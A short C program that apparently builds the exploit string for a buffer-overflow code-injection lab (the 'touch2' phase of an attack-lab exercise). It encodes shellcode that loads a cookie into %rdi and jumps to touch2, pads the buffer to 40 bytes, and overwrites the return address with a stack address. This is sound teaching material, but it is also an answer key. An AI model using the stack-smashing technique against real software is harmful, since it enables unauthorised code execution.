#include<stdio.h>
#include<string.h>

void input_string(char* dest, const char* src, int* p_i, int* p_j)
{
	strcpy(dest + *p_i, src);
	int count = strlen(src) / 3;
	*p_i += (count * 3);
	*p_j += count;
	return;
}
int main()
{
	char print[200];
	int i = 0;
	int j = 0;

	// push $0x59b997fa
	input_string(print, "68 fa 97 b9 59 ", &i, &j);

	// pop %rdi
	input_string(print, "5f ", &i, &j);

	// push $0x4017ec # <touch2>
	input_string(print, "68 ec 17 40 00 ", &i, &j);

	// ret
	input_string(print, "c3 ", &i, &j);

	while(j < 40) 
	{
		input_string(print, "00 ", &i, &j);
	}

	// goto injected code
	input_string(print, "78 dc 61 55", &i, &j);
	printf("%s", print);
	return 0;
}
